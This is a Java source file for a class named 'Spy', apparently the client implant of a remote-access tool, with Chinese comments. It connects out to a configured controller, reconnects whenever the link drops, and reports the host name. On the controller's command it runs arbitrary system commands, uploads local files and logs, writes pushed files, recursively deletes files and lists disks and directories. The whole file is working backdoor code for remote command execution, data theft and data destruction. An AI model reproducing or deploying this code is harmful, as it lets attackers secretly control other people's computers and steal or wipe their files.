package Sleve;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

public class Spy extends Thread {
	static String firestPort="3067";
	static String secondPort="3068";
	Process pro = null;
	static String currentpath = "DiskUnknown!!";// 自动获取第一个磁盘
	static File file;
	static FileInputStream deskin = null;
	static DataInputStream in = null;		//主输入接口
	static DataOutputStream out = null;		//主输出接口
	static DataOutputStream tout=null;		//副输出接口
	static Socket ss = null;				//主通讯端口
	static Socket sc=null;					//副通讯端口
	static LogGenerator log = null;
	static HashMap<String,String> setup = null;
	public static boolean canceled=false;
	static Monitor monitor=null;
	public static boolean power=true;		//文件夹操作权限
	public static void main(String[] args) {
		try {
			log = new LogGenerator("Spy");
		} catch (Exception e) {}
		setup();
		new Spy();
	}
	public static void sendLog() {
		File f=new File("SPyproperties/logs");
		File []log=f.listFiles();
		try {
			out.writeUTF("<#log#>"+log.length);
			BufferedReader fr=null;
			for(File lo:log) {
				fr=new BufferedReader(new FileReader(new File(f,lo.getName())));
				out.writeUTF("<#LOG_FN#>"+lo.getName());
				String a=null;
				while((a=fr.readLine())!=null) {
					out.writeUTF(a);
				}
				try {
					Thread.sleep(100);
				} catch (InterruptedException e) {}
				out.writeUTF("21341343");
				fr.close();
			}
			out.writeUTF("<#LOG_FI#>");				//日志完成
			System.out.println("完成");
		} catch (IOException e) {
			e.printStackTrace();
			try {
				out.writeUTF("<#fail#>");
			} catch (IOException e1) {}
		}
	}
	private static void setup() {
		setup = new HashMap<>();
		setup.put("port","3066");
		setup.put("ip","localhost");
		try {
			BufferedReader bf = new BufferedReader(new FileReader("SPyproperties/startup/setup"));
			String line = null;
			while ((line = bf.readLine()) != null) {
				String key=line.contains(":")?line.substring(0,line.indexOf(":")):null;
				if(key!=null) {
					setup.put(key.trim(), line.substring(line.indexOf(":")+1,line.length()).trim());
				}
			}
			rc("通过配置文件初始化端口和ip完成");
			bf.close();
		} catch (Exception e) {
			rc(3,"配置文件方式初始化失败，正在采用测试配置3066和IP:localhost");
				System.out.println("读取配置文件失败，将采用默认配置");
				File f=new File("SPyproperties/startup");
				f.mkdirs();
				FileWriter fw=null;
				try {
					fw=new FileWriter("SPyproperties/startup/setup");
				} catch (IOException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
				try {
					fw.write("port:3066\r\nip:localhost");
					fw.close();
				} catch (IOException e1) {}
		}

	}
	public Spy(String test) {}//测试内部方法的"接口"
	private Spy() {
		rc("构建主程序");
		boolean b = true;
		while (b) {
			try {
				ss = new Socket(setup.get("ip"),Integer.parseInt(setup.get("port")));
				rc("连接到远程控制台");
				this.start();
				b = false;

			} catch (UnknownHostException e) {
			} catch (IOException e) {
			}
			try {
				Thread.sleep(20);
			} catch (InterruptedException e) {

			}
		}

	}

	@Override
	public void run() {
		rc("启动服务线程");
		try {
			in = new DataInputStream(ss.getInputStream());
			out = new DataOutputStream(ss.getOutputStream());
			out.writeUTF("<#NAME#>" + InetAddress.getLocalHost().getCanonicalHostName());
			rc("报名，请求连接");
		} catch (IOException e) {
			rc(3,"IO流创建失败，可能是远程机器关闭");
		}
		rc("服务线程启动成功");
		while (true) {
			String msg = "";
			canceled=false;
			Monitor.alive=true;
			try {
				msg = in.readUTF();
				rc("收到消息："+msg);
			} catch (IOException e) {
				try {
					ss.close();
				} catch (IOException e1) {}
				try {
					out.close();
				} catch (IOException e1) {}
				Monitor.close();
				try {
					in.close();
				} catch (IOException e1) {}
				new Spy();
				break;
			}
			System.out.println(msg);
			if (msg.startsWith("<#ip#>")) {
				ip(msg);
				try {
					log.record(0, "send ip");
				} catch (IOException e) {
				}
			} else if (msg.startsWith("<#port#>")) {
				try {
					out.writeUTF("<#port#>" + ss.getPort());
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			} else if (msg.startsWith("<#desk#>")) {
				desk(msg);
			} else if (msg.startsWith("<#into#>")) {
				into(msg);
			} else if (msg.startsWith("<#all#>")) {
				all(msg);
			} else if (msg.startsWith("<#getfile#>")) {
				if(exist(msg.substring(11))) {
					boolean run=notifyMonitor(msg);
					if(run) {
						getfile(msg.substring(11));
						try {
							tout.close();
							sc.close();
						} catch (IOException e) {}
						sc=null;
						tout=null;
					}
				}else {
					try {
						out.writeUTF("<#fail#>");
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
				
			}else if(msg.startsWith("<#log#>")) {
				sendLog();
			} else if (msg.startsWith("<#del#>")) {
				file = new File(currentpath + "/" + msg.substring(7).trim());
				del(file);
			} else if (msg.startsWith("<#tree#>")) {
				File f = new File(
						msg.substring(8).toString().trim() == "" ? "D:/" : msg.substring(8).toString().trim());
				tree(f);
			} else if (msg.startsWith("<#ol#>")) {
				leave();
			} else if (msg.startsWith("<#run#>")) {
				run(msg);
			} else if (msg.startsWith("<#input#>")) {
				input(msg);
			} else if (msg.startsWith("<#file#>")) {
				file(msg.substring(8));
				try {
					System.out.println("接收完毕，关闭");
					tout.close();
					sc.close();
					monitor.alive=false;
				} catch (IOException e) {}
				sc=null;
				tout=null;
			}else if(msg.startsWith("<#SAME#>")) {
				System.exit(0);
			}else if(msg.startsWith("<#ALLRUN#>")) {
				allrun(msg);
			}else if(msg.startsWith("<#CONNECT#>")) {
				try {
					getConnect(msg.substring(11));
				} catch (Exception e) {
				}
			}else if(msg.startsWith("<#INITDISK#>")){
				currentpath=File.listRoots()[0].toString();
				file=new File(currentpath);
				try {
					out.writeUTF("<#INITDISK#>"+currentpath);
				} catch (IOException e) {
					e.printStackTrace();
				}
			}else {
				MSGExtended.msgExe(msg);
			}
			try {
				LogGenerator.logcheck();
			} catch (IOException e) {}
		}
		rc("主机断开，已关闭当前线程，重新创建新线程");
	}

	public static void file(String msg) {
		// TODO Auto-generated method stub
		FileOutputStream fi = null;
		try {
			fi = new FileOutputStream(currentpath+msg.trim());
			System.out.println("创建完成"+currentpath+msg.substring(8));
		} catch (FileNotFoundException e1) {
			try {
				tout.writeUTF("<#CANCEL#>");
				out.writeUTF("<#MSG#>操作远程计算机的该目录需要更高的系统权限！");
				out.writeUTF("<#fail#>4");
				rc(2,"磁盘权限原因被拒");
				byte[]b=new byte[1024];
				int len=0;
				rc("正在回收溢出流");
				while((len=in.read(b))>0) {
					if(new String(b,0,len).equals("wfdfadfe*fdf548")) {
						break;
					}
				}
				rc("回收溢出流完成");
			} catch (IOException e) {}
			return;
		}
		byte[] b = new byte[2048];
		int len = 0;
		rc("正在下载文件");
		try {
			while ((len=in.read(b)) > 0) {
				if ("wfdfadfe*fdf548".equals(new String(b, 0, len))) {
					break;
				}
				fi.write(b, 0, len);
			}
			fi.close();
			rc("下载文件完成");
			if(canceled) {
				rc("文件可能因创建时收到权限限制导致取消或被人为取消，删除不完整的文件");
				new File(currentpath+msg.substring(8)).delete();
			}
		} catch (IOException e) {
			rc(3,"正在下载文件时遇到IO异常,可能应为远程主机突然断线");
			return;
		}
		try {
			out.writeUTF("<#successful#>");
		} catch (IOException e) {
		}
	}

	private void input(String msg) {
		// TODO Auto-generated method stub
		DataOutputStream dos = new DataOutputStream(pro.getOutputStream());
		try {
			dos.writeUTF(msg.substring(9));
			out.writeUTF("<#input#>");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			try {
				out.writeUTF("<#inputfail#>");
			} catch (IOException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
			e.printStackTrace();
		}
	}

	private void run(String msg) {
		String cmd=msg.substring(7).trim();
		rc("执行命令："+cmd);
		Runtime r = Runtime.getRuntime();
		try {
			pro = r.exec(cmd);
			rc("执行成功:"+cmd);
			BufferedReader bf=new BufferedReader(new InputStreamReader(pro.getInputStream()));
			String cell="";
			String result="";
			while((cell=bf.readLine())!=null) {
				result+=cell+"\n";
			}
			out.writeUTF("<#execed#>"+result);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			try {
				rc("执行失败:"+cmd);
				out.writeUTF("<#execfail#>");
			} catch (IOException e1) {}
		}

	}
	private void allrun(String msg) {
		String cmd=msg.substring(10).trim();
		rc("执行命令："+cmd);
		Runtime r = Runtime.getRuntime();
		try {
			pro = r.exec(cmd);
			rc("执行成功："+cmd);
			out.writeUTF("<#SU#>");
			
		} catch (IOException e) {
			// TODO Auto-generated catch block
			try {
				rc("执行失败："+cmd);
				out.writeUTF("<#FA#>");
			} catch (IOException e1) {
			}
		}

	}
	private void leave() {
		rc("主机被命令停止");
		// TODO Auto-generated method stub
		try {
			out.writeUTF("<#leave#>");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		try {
			Thread.sleep(1000);
		} catch (InterruptedException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		try {
			out.close();
			in.close();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		try {
			ss.close();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		System.exit(0);
	}

	private void all(String msg) {//查看文件
		rc("查看文件列表");
		// TODO Auto-generated method stub
		String level=msg.substring(7).trim();
		if(level.equalsIgnoreCase("-t")) {//查看文件详情
			fileview1(false);
		}else if(level.equalsIgnoreCase("-ts")) {
			fileview1(true);
		}else {
			fileview0();
		}
	}
	private void fileview0() {
		rc("文件列表等级：0");
		// TODO Auto-generated method stub
		File[] l = file.listFiles();
		StringBuffer s = new StringBuffer("<#simpleall#>");
		
		int i=0;
		for (File f : l) {
			if (f.isDirectory()) {
				s.append(f.getName()+"\n");
			} else {
				s.append(f.getName()+"\n");
			}
			
		}
		try {
			out.writeUTF(s.toString());
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	private void fileview1(boolean smart) {		//查看文件详情
		rc("文件列表等级：1");
		List<String> isfile=new ArrayList<>();//文件信息，全部为文件而非目录
		// TODO Auto-generated method stub
		File[] l = file.listFiles();
		String s = new String("<#all#>*access*size*name*\n");
		try {
			out.writeUTF(s);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		int i=0;
		for (File f : l) {
			String ss="";
			if(f.getName().equals("$RECYCLE.BIN")) {
				continue;
			}
			long bytecount=getfsize(f);
			String filesize="0";
			double sm=bytecount;//文件大小的double值
			if(smart) {
				
				int count=0;//应该转换的单位
				for(;sm>=1024;) {
					sm/=1024;
					count++;
				}
				sm=(int) (sm*100);
				sm/=100;
				if(count==0) {
					filesize=(int)sm+"B";
				}else if(count==1){
					filesize=sm+"KB";
				}else if(count==2) {
					filesize=sm+"MB";
				}else if(count==3) {
					filesize=sm+"GB";
				}else if(count==4) {
					filesize=sm+"TB";
				}else if(count>4) {
					filesize=sm+">>";
				}
			}else {
				filesize=sm+"B";
			}
			if(f.isDirectory()) {
				ss+="<#all#>"+("d"+(f.canRead()?"r":"-")+(f.canWrite()?"w":"-")+(f.canExecute()?"x":"-")+"*"+filesize+"*"+f.getName()+"\n");
			}else {
				isfile.add(("-"+(f.canRead()?"r":"-")+(f.canWrite()?"w":"-")+(f.canExecute()?"x":"-")+"*"+filesize+"*"+f.getName()+"\n"));
			}
			try {
				out.writeUTF(ss);
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		for(String f_:isfile) {
			try {
				out.writeUTF("<#all#>"+f_);
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		try {
			out.writeUTF("<#END#>");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	public long getfsize(File file) {
		long size=0;
		if(file.isDirectory()) {
			File[] l=file.listFiles();
			try {
				for(File f:l) {
					size+=getfsize(f);
				}
			}catch(Exception e) {System.out.println("问题目录："+file);}
		}else {
			
				size=file.length();
		}
		return size;
	}
	private void desk(String msg) {
		rc("磁盘信息被获取");
		// TODO Auto-generated method stub
		File[] f = File.listRoots();
		String s = "<#desk#>";

		for (int i = 0; i < f.length; i++) {
			s += f[i].toString() + "*" + f[i].getTotalSpace() / 1024 / 1024 / 1024 + "GB";
			if(i!=f.length-1) {
				s+=" ";
			}
		}
		

			try {
				out.writeUTF(s);
			} catch (IOException e) {
				rc(4,"磁盘获取时远程机掉线");
			}
	}
	private void into(String msg) {
		rc("切换目录");
		String p = msg.substring(8);
		p.replace("\\", "/");
		String bu = currentpath;
		File f = null;
		if (p.indexOf(':') == 1) {
			if (p.lastIndexOf('/') == p.length() - 1) {
				bu = p;
			} else {
				bu = p + "/";
			}
		} else {
			if (p.lastIndexOf('/') == p.length() - 1) {
				bu += p;
			} else {
				bu += p + "/";
			}
		}
		try {
			f = new File(bu);
			if (f.isDirectory()) {
				rc("目录切换成功");
				out.writeUTF("<#successful#>");
			} else {
				rc("目录切换失败");
				out.writeUTF("<#fail#>5");
				return;
			}

		} catch (Exception e) {
			rc(4,"切换目录时远程机器掉线");
		}
		if (p.indexOf(':') == 1) {
			if (p.lastIndexOf('/') == p.length() - 1) {
				currentpath = p;
			} else {
				currentpath = p + "/";
			}
		} else {
			if (p.lastIndexOf('/') == p.length() - 1) {
				currentpath += p;
			} else {
				currentpath += p + "/";
			}
		}
		File fi = new File(currentpath);
		if (!(fi.isDirectory())) {
			try {
				out.writeUTF("<#MSG#>drictory no found!");
			} catch (IOException e) {
			}
			return;
		}
		file = fi;
	}
	private static boolean exist(String file) {
		String filename="";
		if(file.indexOf(":")==1) {
			filename=file;
		}else {
			filename=currentpath+file;
		}
		try {
			FileInputStream fi=new FileInputStream(filename);
			try {
				fi.close();
			} catch (IOException e) {}
			return true;
		} catch (FileNotFoundException e) {
			return false;
		}
	}
	public static void getfile(String file) {
		rc("远程机器要求发送文件");
		String filename="";
		String simplefilename="";
		if(file.indexOf(":")==1) {
			filename=file;
		}else {
			filename=currentpath+file;
		}
		try {
			FileInputStream fi=new FileInputStream(filename);
			try {
				fi.close();
			} catch (IOException e) {}
		} catch (FileNotFoundException e) {
			System.out.println("文件不存在");
		}

		int i = filename.lastIndexOf("/");
		simplefilename=filename.substring(i+1);
		try {
			out.writeUTF("<#getfile#>"+simplefilename);
		} catch (IOException e3) {}
		try {
			deskin=new FileInputStream(filename);
		} catch (FileNotFoundException e3) {}
		try {
			byte[] b = new byte[2048];
			int len = 0;
			long filesize=new File(filename).length();		//获取文件的大小
			long fs=filesize/1024/1024;
			tout.writeUTF("<#FSIZE#>"+fs+"mb");
			long temp=filesize/100;				
			long current=0L;														//记录当前进度
			System.out.println("开始发送文件");
			rc("正在从本地读取文件发送至远程主机");
			while ((len = deskin.read(b)) > 0) {
				out.write(b, 0, len);
				if(current>=temp) {
					tout.writeUTF("<#PROGRESS#>");								//发送进度信息
					current=current-temp;
				}
				current+=len;
				if(canceled) {
					System.out.println("取消成功");
					rc("取消发送");
					break;
				}
			}
			rc("发送完成");
			System.out.println("发送完成");
			Thread.sleep(500);// 睡眠500毫秒钟发送结束文件的命令，睡一秒钟是为了等待对方就绪
			out.write("wfdfadfe*fdf548".getBytes());
			out.writeUTF("<#successful#>");
			if(canceled) {
				out.writeUTF("<#MSG#>已取消");
				log.record(1, "本次传输已取消");
			}else {
				rc("远程主机已获取到文件："+filename);
			}
			canceled=false;
			return;
		} catch (Exception e) {
			e.printStackTrace();
			try {
				log.record(1, "getfile方法区，传输中断");
			} catch (IOException e2) {
			}
			try {
				out.writeUTF("<#fail#>3");
				return;
			} catch (IOException e1) {
			}
		}
	}

	public void del(File file) {
		rc("远程主机要求删除目标文件");
		if (file.isDirectory()) {
			File[] f = file.listFiles();
			for (File x : f) {
				del(x);
			}
		} else {
			file.delete();
			return;
		}
		file.delete();
		try {
			rc("删除成功");
			out.writeUTF("<#MSG#>deleted");
		} catch (IOException e) {
			rc(2,"删除失败");
			try {
				log.record(1, "删除失败");
			} catch (IOException e1) {
			}
			return;
		}
	}

	public void ip(String msg) {
		try {
			out.writeUTF("<#ip#>" + ss.getInetAddress().toString());
		} catch (IOException e) {}
	}

	StringBuffer s = new StringBuffer();
	int count = 0;

	public void tree(File f) {
		if (f.isDirectory()) {
			count++;
			s.append("\n\t" + f.getName() + "\n\t");
			File[] ff = f.listFiles();
			if (ff == null) {
				s.append(f.getName());
			} else {
				for (File x : ff) {
					tree(x);
					try {
						Thread.sleep(1);
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			}
		} else {
			s.append(f.getName());
		}
		try {
			out.writeUTF("<#tree#>" + s.toString());
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	public static  boolean notifyMonitor(String msg){					//通知程序开启另外的监听端口
		rc("正在通知远程机器开启副监听端口");
		try {
			String send=firestPort;
			out.writeUTF("<#OpenPort#>"+send);
			while(true) {													//接收cmd发送的消息，是否开启成功
				String port=in.readUTF();
				if(port.startsWith("<#OpenSuccess#>")) {
					System.out.println("收到打开成功的消息");
					rc("远程主机回归消息：打开成功");
					break;
				}else if(port.startsWith("<#OpenFail#>")){
					rc(2,"远程主机回归消息：打开失败，极可能端口被占用");
					out.writeUTF("<#OpenPort#>"+secondPort);
					send=secondPort;
				}
			}
			getConnect(send);
			return true;
		}catch(Exception e) {
			rc(2,"未知错误出现在通知远程开启副监听端口的语句块上");
			return false;
		}
		
	}
	public static boolean getConnect(String send) throws NumberFormatException{
		rc("开始建立Socket");
		System.out.println("创建时端口："+send);
		try {
			sc=new Socket(setup.get("ip"),Integer.parseInt(send));
			rc("Socket建立成功");
		} catch (Exception e) {
			rc(2,"Socket建立失败");
			try {
				sc.close();
			} catch (IOException e1) {}
			return false;
		}
		monitor=new Monitor();
		monitor.start();
		try {
			tout=new DataOutputStream(sc.getOutputStream());
		} catch (IOException e) {
			try {
				sc.close();
			} catch (IOException e1) {}
			monitor.alive=false;
			return false;
		}
		System.out.println("监听端口创建成功");
		return true;
	}
	static void rc(int status,String msg) {
		try {
			log.record(status, msg);
		} catch (IOException e) {}
	}
	static void rc(String msg) {
		rc(1,msg);
	}
}